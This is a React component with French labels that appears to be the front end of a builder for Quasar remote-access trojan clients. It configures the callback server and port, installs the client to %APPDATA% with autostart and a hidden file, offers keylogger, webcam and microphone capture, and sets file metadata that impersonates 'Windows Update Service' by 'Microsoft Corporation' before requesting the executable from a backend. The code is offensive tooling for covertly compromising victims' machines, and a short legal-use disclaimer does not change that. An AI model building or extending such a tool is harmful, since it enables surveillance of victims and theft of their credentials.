import React, { useState, useCallback, useMemo } from 'react';
import { Package, Download, Settings, Shield, Zap, AlertTriangle, CheckCircle } from 'lucide-react';
import toast from 'react-hot-toast';
import api from '../utils/api';

const PayloadBuilder = () => {
  const [config, setConfig] = useState({
    host: 'localhost',
    port: '4782',
    password: '',
    installPath: '%APPDATA%',
    installName: 'client.exe',
    startup: true,
    hideFile: true,
    enableKeylogger: false,
    enableWebcam: false,
    enableMicrophone: false,
    reconnectDelay: 5000,
    enableUPnP: false,
    enableProxy: false,
    proxyHost: '',
    proxyPort: '',
    description: 'Windows Update Service',
    company: 'Microsoft Corporation',
    version: '1.0.0.0'
  });

  const [building, setBuilding] = useState(false);
  const [buildProgress, setBuildProgress] = useState(0);

  // Utiliser useCallback pour éviter les re-renders inutiles
  const handleInputChange = useCallback((e) => {
    const { name, value, type, checked } = e.target;
    setConfig(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? checked : value
    }));
  }, []);

  const validateConfig = () => {
    if (!config.host || !config.port || !config.password) {
      toast.error('Veuillez remplir tous les champs obligatoires');
      return false;
    }
    
    if (isNaN(config.port) || config.port < 1 || config.port > 65535) {
      toast.error('Le port doit être un nombre entre 1 et 65535');
      return false;
    }

    if (config.password.length < 6) {
      toast.error('Le mot de passe doit contenir au moins 6 caractères');
      return false;
    }

    return true;
  };

  const buildPayload = async () => {
    if (!validateConfig()) return;

    console.log("=" * 80);
    console.log("🚀 [DEBUG FRONTEND] DÉBUT GÉNÉRATION PAYLOAD");
    console.log("=" * 80);
    console.log("⚙️ [DEBUG] Configuration actuelle:", JSON.stringify(config, null, 2));
    console.log("🌐 [DEBUG] URL backend:", process.env.REACT_APP_BACKEND_URL);
    console.log("🕐 [DEBUG] Timestamp:", new Date().toISOString());
    console.log("🔍 [DEBUG] Variables d'environnement React:");
    console.log("  - REACT_APP_BACKEND_URL:", process.env.REACT_APP_BACKEND_URL);
    console.log("  - NODE_ENV:", process.env.NODE_ENV);
    console.log("🌐 [DEBUG] État du navigator:");
    console.log("  - navigator.onLine:", navigator.onLine);
    console.log("  - navigator.connection:", navigator.connection);
    console.log("  - window.location.origin:", window.location.origin);

    setBuilding(true);
    setBuildProgress(0);

    try {
      console.log("📋 [DEBUG] Étapes de génération...");
      // Étapes de génération réalistes
      const steps = [
        'Validation de la configuration...',
        'Compilation du stub client...',
        'Injection des paramètres de connexion...',
        'Configuration des fonctionnalités...',
        'Génération du payload final...',
        'Signature et compression...'
      ];

      for (let i = 0; i < steps.length; i++) {
        console.log(`📝 [DEBUG] Étape ${i + 1}/${steps.length}: ${steps[i]}`);
        toast.loading(steps[i], { id: 'build-progress' });
        setBuildProgress(((i + 1) / steps.length) * 100);
        await new Promise(resolve => setTimeout(resolve, 800));
      }

      console.log("🔗 [DEBUG] Préparation de l'appel API...");
      console.log("📤 [DEBUG] Données à envoyer:", JSON.stringify(config, null, 2));
      
      // Appel à l'API backend pour générer le payload réel
      console.log('🔧 [DEBUG] Envoi de la configuration au backend...');
      toast.loading('Génération du payload sur le serveur...', { id: 'build-progress' });
      
      console.log("📡 [DEBUG] Configuration axios avant requête:");
      console.log("  - Base URL:", api.defaults.baseURL);
      console.log("  - Timeout:", api.defaults.timeout);
      console.log("  - Headers:", api.defaults.headers);
      
      console.log("🚀 [DEBUG] Lancement de la requête POST /api/payload/generate...");
      const startTime = performance.now();
      
      // PRE-REQUEST DEBUG
      console.log("🔍 [DEBUG PRE-REQUEST] État avant la requête:");
      console.log("  - Backend URL:", api.defaults.baseURL);
      console.log("  - Request URL complète:", `${api.defaults.baseURL}/api/payload/generate`);
      console.log("  - Navigator online:", navigator.onLine);
      console.log("  - Timestamp:", new Date().toISOString());
      
      let response;
      try {
        console.log("📡 [DEBUG] Début appel API...");
        response = await api.post('/api/payload/generate', config, {
          timeout: 30000, // 30 seconds timeout
          onUploadProgress: (progressEvent) => {
            const percentCompleted = Math.round((progressEvent.loaded * 100) / progressEvent.total);
            console.log(`📤 [DEBUG] Upload progress: ${percentCompleted}%`);
          }
        });
        console.log("✅ [DEBUG] Appel API terminé avec succès");
      } catch (apiError) {
        console.log("❌ [DEBUG] Erreur lors de l'appel API:");
        console.log("  - Error type:", typeof apiError);
        console.log("  - Error constructor:", apiError.constructor.name);
        console.log("  - Error message:", apiError.message);
        console.log("  - Error code:", apiError.code);
        console.log("  - Error isAxiosError:", apiError.isAxiosError);
        throw apiError; // Re-throw pour être traité par le catch principal
      }
      
      const endTime = performance.now();
      console.log(`⏱️ [DEBUG] Requête terminée en ${endTime - startTime}ms`);
      console.log("📥 [DEBUG] Status de réponse:", response.status);
      console.log("📥 [DEBUG] Headers de réponse:", response.headers);
      console.log('📦 [DEBUG] Réponse complète du serveur:', JSON.stringify(response.data, null, 2));
      
      if (response.data.success) {
        console.log("✅ [DEBUG] Génération réussie, début du téléchargement...");
        toast.loading('Téléchargement du payload...', { id: 'build-progress' });
        console.log('🔄 [DEBUG] Début du téléchargement du payload...');
        
        const downloadUrl = `/api/payload/download/${response.data.payload_id}`;
        console.log("🌐 [DEBUG] URL de téléchargement:", downloadUrl);
        
        // Télécharger le fichier généré avec timeout augmenté
        try {
          console.log("📥 [DEBUG] Lancement de la requête de téléchargement...");
          const downloadStartTime = performance.now();
          
          const downloadResponse = await api.get(downloadUrl, {
            responseType: 'blob',
            timeout: 60000, // 60 seconds timeout
            onDownloadProgress: (progressEvent) => {
              if (progressEvent.total) {
                const percentCompleted = Math.round((progressEvent.loaded * 100) / progressEvent.total);
                console.log(`📥 [DEBUG] Téléchargement: ${percentCompleted}% (${progressEvent.loaded}/${progressEvent.total} bytes)`);
              } else {
                console.log(`📥 [DEBUG] Téléchargement: ${progressEvent.loaded} bytes reçus`);
              }
            }
          });
          
          const downloadEndTime = performance.now();
          console.log(`⏱️ [DEBUG] Téléchargement terminé en ${downloadEndTime - downloadStartTime}ms`);
          console.log("📥 [DEBUG] Status de téléchargement:", downloadResponse.status);
          console.log("📥 [DEBUG] Headers de téléchargement:", downloadResponse.headers);
          console.log('📁 [DEBUG] Fichier téléchargé, taille:', downloadResponse.data.size, 'bytes');
          console.log('📁 [DEBUG] Type de contenu:', downloadResponse.headers['content-type']);
          
          if (!downloadResponse.data || downloadResponse.data.size === 0) {
            throw new Error("Fichier vide reçu du serveur");
          }
          
          // Créer le blob pour le téléchargement
          console.log("💾 [DEBUG] Création du blob pour téléchargement...");
          const blob = new Blob([downloadResponse.data], { type: 'application/octet-stream' });
          console.log("✅ [DEBUG] Blob créé, taille:", blob.size);
          
          const url = URL.createObjectURL(blob);
          console.log("🔗 [DEBUG] URL d'objet créée:", url);
          
          const a = document.createElement('a');
          a.href = url;
          a.download = config.installName;
          a.style.display = 'none';
          console.log("🔗 [DEBUG] Élément <a> créé:", { href: a.href, download: a.download });
          
          document.body.appendChild(a);
          console.log("📎 [DEBUG] Élément ajouté au DOM");
          
          a.click();
          console.log("🖱️ [DEBUG] Clic simulé pour téléchargement");
          
          document.body.removeChild(a);
          URL.revokeObjectURL(url);
          console.log("🧹 [DEBUG] Nettoyage DOM et URL effectué");
          
          toast.success('Payload généré et téléchargé avec succès !', { id: 'build-progress' });
          console.log('✅ [DEBUG] Payload téléchargé avec succès:', config.installName);
          console.log("=" * 80);
          console.log("🎉 [DEBUG FRONTEND] FIN GÉNÉRATION PAYLOAD - SUCCÈS");
          console.log("=" * 80);
          
        } catch (downloadError) {
          console.log("=" * 80);
          console.log("❌ [DEBUG FRONTEND] ERREUR DE TÉLÉCHARGEMENT");
          console.log("=" * 80);
          console.error('❌ [DEBUG] Erreur spécifique de téléchargement:', downloadError);
          console.error('❌ [DEBUG] Type d\'erreur:', downloadError.name);
          console.error('❌ [DEBUG] Message:', downloadError.message);
          console.error('❌ [DEBUG] Code d\'erreur:', downloadError.code);
          console.error('❌ [DEBUG] Status HTTP:', downloadError.response?.status);
          console.error('❌ [DEBUG] Data de réponse:', downloadError.response?.data);
          console.error('❌ [DEBUG] Headers de réponse:', downloadError.response?.headers);
          console.error('❌ [DEBUG] Config de requête:', downloadError.config);
          console.log("=" * 80);
          throw new Error(`Erreur de téléchargement: ${downloadError.message}`);
        }
        
      } else {
        console.log("❌ [DEBUG] Échec de génération côté serveur");
        console.log("❌ [DEBUG] Détails de l'erreur:", response.data);
        throw new Error(response.data.error || 'Erreur de génération du serveur');
      }

    } catch (error) {
      console.log("=" * 80);
      console.log("❌ [DEBUG FRONTEND] ERREUR COMPLÈTE LORS DE LA GÉNÉRATION");
      console.log("=" * 80);
      console.error('❌ [DEBUG] Erreur complète lors de la génération:', error);
      console.error('❌ [DEBUG] Type d\'erreur:', error.constructor.name);
      console.error('❌ [DEBUG] Message d\'erreur:', error.message);
      console.error('❌ [DEBUG] Stack trace:', error.stack);
      console.error('❌ [DEBUG] Code d\'erreur:', error.code);
      console.error('❌ [DEBUG] Timeout:', error.timeout);
      console.error('❌ [DEBUG] Response status:', error.response?.status);
      console.error('❌ [DEBUG] Response data:', error.response?.data);
      console.error('❌ [DEBUG] Response headers:', error.response?.headers);
      console.error('❌ [DEBUG] Request config:', error.config);
      console.error('❌ [DEBUG] Request URL:', error.config?.url);
      console.error('❌ [DEBUG] Request method:', error.config?.method);
      console.error('❌ [DEBUG] Request data:', error.config?.data);
      
      // NOUVELLES LIGNES DE DEBUG DÉTAILLÉES
      console.log("🔍 [DEBUG DÉTAILLÉ] Analyse complète de l'erreur:");
      console.log("  - Error name:", error.name);
      console.log("  - Error toString():", error.toString());
      console.log("  - Error isAxiosError:", error.isAxiosError);
      console.log("  - Error cause:", error.cause);
      console.log("  - Error errno:", error.errno);
      console.log("  - Error syscall:", error.syscall);
      console.log("  - Error hostname:", error.hostname);
      console.log("  - Error port:", error.port);
      console.log("  - Error address:", error.address);
      
      if (error.request) {
        console.log("🌐 [DEBUG REQUEST] Détails de la requête:");
        console.log("  - Request readyState:", error.request.readyState);
        console.log("  - Request status:", error.request.status);
        console.log("  - Request statusText:", error.request.statusText);
        console.log("  - Request responseURL:", error.request.responseURL);
        console.log("  - Request timeout:", error.request.timeout);
      }
      
      if (error.response) {
        console.log("📥 [DEBUG RESPONSE] Détails de la réponse:");
        console.log("  - Response config:", error.response.config);
        console.log("  - Response request:", error.response.request);
        console.log("  - Response statusText:", error.response.statusText);
      }
      
      console.log("🔍 [DEBUG CONDITIONS] Tests de condition d'erreur:");
      console.log("  - error.code === 'ECONNABORTED':", error.code === 'ECONNABORTED');
      console.log("  - error.code === 'NETWORK_ERROR':", error.code === 'NETWORK_ERROR');
      console.log("  - error.message.includes('Network Error'):", error.message.includes('Network Error'));
      console.log("  - error.message.includes('network error'):", error.message.includes('network error'));
      console.log("  - error.message.toLowerCase():", error.message.toLowerCase());
      console.log("=" * 80);
      
      let errorMsg = 'Erreur de génération du payload';
      let debugReason = 'Erreur inconnue';
      
      if (error.code === 'ECONNABORTED') {
        console.log("⏰ [DEBUG] Erreur de timeout détectée");
        errorMsg = 'Timeout - La génération a pris trop de temps';
        debugReason = 'TIMEOUT (ECONNABORTED)';
      } else if (error.code === 'NETWORK_ERROR' || error.message.includes('Network Error') || error.message.includes('network error')) {
        console.log("🌐 [DEBUG] Erreur réseau détectée");
        errorMsg = 'Erreur réseau - Vérifiez votre connexion';
        debugReason = 'NETWORK_ERROR ou "Network Error" dans message';
      } else if (error.code === 'ENOTFOUND') {
        console.log("🔍 [DEBUG] Erreur DNS détectée");
        errorMsg = 'Erreur DNS - Impossible de résoudre l\'hôte';
        debugReason = 'DNS_ERROR (ENOTFOUND)';
      } else if (error.code === 'ECONNREFUSED') {
        console.log("🚫 [DEBUG] Connexion refusée détectée");
        errorMsg = 'Connexion refusée - Serveur indisponible';
        debugReason = 'CONNECTION_REFUSED (ECONNREFUSED)';
      } else if (error.response?.status >= 500) {
        console.log("🔧 [DEBUG] Erreur serveur détectée");
        errorMsg = `Erreur serveur (${error.response.status}) - ${error.response.statusText}`;
        debugReason = `SERVER_ERROR (${error.response.status})`;
      } else if (error.response?.status >= 400) {
        console.log("🚨 [DEBUG] Erreur client détectée");
        errorMsg = `Erreur client (${error.response.status}) - ${error.response.statusText}`;
        debugReason = `CLIENT_ERROR (${error.response.status})`;
      } else if (error.response?.data?.detail) {
        console.log("📝 [DEBUG] Erreur avec détail du serveur");
        errorMsg = error.response.data.detail;
        debugReason = 'SERVER_DETAIL_ERROR';
      } else if (error.message) {
        console.log("📝 [DEBUG] Erreur avec message standard");
        errorMsg = error.message;
        debugReason = 'MESSAGE_ERROR';
      }
      
      console.log("🔔 [DEBUG] Message d'erreur final:", errorMsg);
      console.log("🎯 [DEBUG] Raison identifiée:", debugReason);
      console.log("🔍 [DEBUG] Conseils de debug:");
      console.log("  1. Vérifiez que le backend est démarré sur http://localhost:8001");
      console.log("  2. Testez manuellement: curl -X GET http://localhost:8001/");
      console.log("  3. Vérifiez les logs du backend: tail -f /var/log/supervisor/backend.*.log");
      console.log("  4. Vérifiez la configuration réseau et les proxies");
      console.log("=" * 80);
      
      toast.error(`Erreur: ${errorMsg} [${debugReason}]`, { id: 'build-progress' });
    } finally {
      console.log("🏁 [DEBUG] Nettoyage final...");
      setBuilding(false);
      setBuildProgress(0);
      console.log("✅ [DEBUG] États réinitialisés");
    }
  };

  // Mémoriser le composant ConfigSection pour éviter les re-renders
  const ConfigSection = useMemo(() => ({ title, icon: Icon, children }) => (
    <div className="discord-card">
      <div className="flex items-center mb-4">
        <Icon className="w-5 h-5 text-discord-blurple mr-2" />
        <h3 className="text-lg font-semibold text-white">{title}</h3>
      </div>
      {children}
    </div>
  ), []);

  return (
    <div className="space-y-6 fade-in">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-white mb-2">Générateur de Payload</h1>
          <p className="text-discord-light">Configurez et générez votre client Quasar personnalisé</p>
        </div>
        <div className="flex items-center space-x-3">
          <div className="flex items-center space-x-2 text-sm">
            <Shield className="w-4 h-4 text-discord-green" />
            <span className="text-discord-light">Sécurisé</span>
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Configuration Forms */}
        <div className="lg:col-span-2 space-y-6">
          {/* Connection Settings */}
          <ConfigSection title="Paramètres de Connexion" icon={Settings}>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium text-discord-lighter mb-2">
                  Adresse du serveur *
                </label>
                <input
                  type="text"
                  name="host"
                  value={config.host}
                  onChange={handleInputChange}
                  className="discord-input"
                  placeholder="192.168.1.100"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-discord-lighter mb-2">
                  Port *
                </label>
                <input
                  type="number"
                  name="port"
                  value={config.port}
                  onChange={handleInputChange}
                  className="discord-input"
                  placeholder="4782"
                  min="1"
                  max="65535"
                />
              </div>
              <div className="md:col-span-2">
                <label className="block text-sm font-medium text-discord-lighter mb-2">
                  Mot de passe *
                </label>
                <input
                  type="password"
                  name="password"
                  value={config.password}
                  onChange={handleInputChange}
                  className="discord-input"
                  placeholder="Mot de passe sécurisé"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-discord-lighter mb-2">
                  Délai de reconnexion (ms)
                </label>
                <input
                  type="number"
                  name="reconnectDelay"
                  value={config.reconnectDelay}
                  onChange={handleInputChange}
                  className="discord-input"
                  placeholder="5000"
                />
              </div>
            </div>
          </ConfigSection>

          {/* Installation Settings */}
          <ConfigSection title="Paramètres d'Installation" icon={Package}>
            <div className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-discord-lighter mb-2">
                    Chemin d'installation
                  </label>
                  <input
                    type="text"
                    name="installPath"
                    value={config.installPath}
                    onChange={handleInputChange}
                    className="discord-input"
                    placeholder="%APPDATA%"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-discord-lighter mb-2">
                    Nom du fichier
                  </label>
                  <input
                    type="text"
                    name="installName"
                    value={config.installName}
                    onChange={handleInputChange}
                    className="discord-input"
                    placeholder="client.exe"
                  />
                </div>
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <label className="flex items-center space-x-2">
                  <input
                    type="checkbox"
                    name="startup"
                    checked={config.startup}
                    onChange={handleInputChange}
                    className="rounded bg-discord-gray-700 border-discord-gray-600 text-discord-blurple focus:ring-discord-blurple focus:ring-offset-discord-gray-800"
                  />
                  <span className="text-discord-light">Démarrage automatique</span>
                </label>
                <label className="flex items-center space-x-2">
                  <input
                    type="checkbox"
                    name="hideFile"
                    checked={config.hideFile}
                    onChange={handleInputChange}
                    className="rounded bg-discord-gray-700 border-discord-gray-600 text-discord-blurple focus:ring-discord-blurple focus:ring-offset-discord-gray-800"
                  />
                  <span className="text-discord-light">Masquer le fichier</span>
                </label>
              </div>
            </div>
          </ConfigSection>

          {/* Feature Settings */}
          <ConfigSection title="Fonctionnalités" icon={Zap}>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <label className="flex items-center space-x-2">
                <input
                  type="checkbox"
                  name="enableKeylogger"
                  checked={config.enableKeylogger}
                  onChange={handleInputChange}
                  className="rounded bg-discord-gray-700 border-discord-gray-600 text-discord-blurple focus:ring-discord-blurple focus:ring-offset-discord-gray-800"
                />
                <span className="text-discord-light">Keylogger</span>
              </label>
              <label className="flex items-center space-x-2">
                <input
                  type="checkbox"
                  name="enableWebcam"
                  checked={config.enableWebcam}
                  onChange={handleInputChange}
                  className="rounded bg-discord-gray-700 border-discord-gray-600 text-discord-blurple focus:ring-discord-blurple focus:ring-offset-discord-gray-800"
                />
                <span className="text-discord-light">Webcam</span>
              </label>
              <label className="flex items-center space-x-2">
                <input
                  type="checkbox"
                  name="enableMicrophone"
                  checked={config.enableMicrophone}
                  onChange={handleInputChange}
                  className="rounded bg-discord-gray-700 border-discord-gray-600 text-discord-blurple focus:ring-discord-blurple focus:ring-offset-discord-gray-800"
                />
                <span className="text-discord-light">Microphone</span>
              </label>
              <label className="flex items-center space-x-2">
                <input
                  type="checkbox"
                  name="enableUPnP"
                  checked={config.enableUPnP}
                  onChange={handleInputChange}
                  className="rounded bg-discord-gray-700 border-discord-gray-600 text-discord-blurple focus:ring-discord-blurple focus:ring-offset-discord-gray-800"
                />
                <span className="text-discord-light">UPnP</span>
              </label>
            </div>
          </ConfigSection>
        </div>

        {/* Build Panel */}
        <div className="space-y-6">
          {/* Build Status */}
          <div className="discord-card">
            <h3 className="text-lg font-semibold text-white mb-4 flex items-center">
              <Package className="w-5 h-5 text-discord-blurple mr-2" />
              Génération
            </h3>
            
            {building && (
              <div className="mb-4">
                <div className="w-full bg-discord-gray-700 rounded-full h-2 mb-2">
                  <div
                    className="bg-discord-blurple h-2 rounded-full transition-all duration-300"
                    style={{ width: `${buildProgress}%` }}
                  ></div>
                </div>
                <p className="text-sm text-discord-light text-center">{buildProgress}%</p>
              </div>
            )}

            <button
              onClick={buildPayload}
              disabled={building}
              className="w-full discord-button flex items-center justify-center space-x-2 py-3"
            >
              {building ? (
                <>
                  <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
                  <span>Génération...</span>
                </>
              ) : (
                <>
                  <Download className="w-4 h-4" />
                  <span>Générer Payload</span>
                </>
              )}
            </button>
          </div>

          {/* Configuration Summary */}
          <div className="discord-card">
            <h3 className="text-lg font-semibold text-white mb-4">Résumé</h3>
            <div className="space-y-3 text-sm">
              <div className="flex justify-between">
                <span className="text-discord-light">Serveur:</span>
                <span className="text-white">{config.host}:{config.port}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-discord-light">Installation:</span>
                <span className="text-white">{config.installPath}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-discord-light">Démarrage auto:</span>
                <span className={config.startup ? "text-discord-green" : "text-discord-red"}>
                  {config.startup ? "Activé" : "Désactivé"}
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-discord-light">Keylogger:</span>
                <span className={config.enableKeylogger ? "text-discord-green" : "text-discord-red"}>
                  {config.enableKeylogger ? "Activé" : "Désactivé"}
                </span>
              </div>
            </div>
          </div>

          {/* Warning */}
          <div className="bg-discord-red bg-opacity-10 border border-discord-red rounded-lg p-4">
            <div className="flex items-start space-x-3">
              <AlertTriangle className="w-5 h-5 text-discord-red flex-shrink-0 mt-0.5" />
              <div>
                <h4 className="text-sm font-medium text-discord-red mb-1">Avertissement</h4>
                <p className="text-xs text-discord-light">
                  Ce payload doit être utilisé uniquement dans un cadre légal et autorisé. 
                  L'utilisation non autorisée peut violer les lois locales.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PayloadBuilder;